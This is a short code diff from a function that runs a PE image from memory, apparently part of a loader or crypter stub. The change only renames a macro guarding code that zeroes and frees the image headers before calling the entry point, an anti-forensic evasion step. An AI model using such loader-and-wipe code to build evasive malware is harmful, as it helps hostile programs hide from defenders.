@@ -200,14 +200,14 @@ static void ExecuteFromMemory(unsigned char* data) {
     // Execute entrypoint
     void *entryPtr = (BYTE*)base + nt->OptionalHeader.AddressOfEntryPoint;
 
-#ifdef ENCRYPT
+#ifdef FREEMEM
     PVOID stubBase = data;
     SIZE_T stubSize = nt->OptionalHeader.SizeOfHeaders;
 	
     NtProtectVirtualMemory((HANDLE)-1, &stubBase, &stubSize, PAGE_READWRITE, &oldProtect);
     RtlSecureZeroMemory(stubBase, stubSize);
     NtFreeVirtualMemory((HANDLE)-1, &stubBase, &stubSize, MEM_RELEASE);
-#endif // ENCRYPT
+#endif // FREEMEM
 
     ((void(*)(void))entryPtr)();
 }
